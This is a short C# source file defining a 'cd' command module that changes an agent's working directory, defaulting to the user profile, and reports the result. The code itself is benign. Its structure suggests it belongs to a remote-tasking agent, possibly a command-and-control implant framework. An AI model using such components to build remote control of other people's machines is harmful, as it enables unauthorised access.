using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ChangeDirectoryCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Cd;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            string path; 

            if(!task.HasParameter(ParameterId.Path))
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            else
                path = task.GetParameter<string>(ParameterId.Path);

            Directory.SetCurrentDirectory(path);

            context.AppendResult(Directory.GetCurrentDirectory());
        }
    }
}
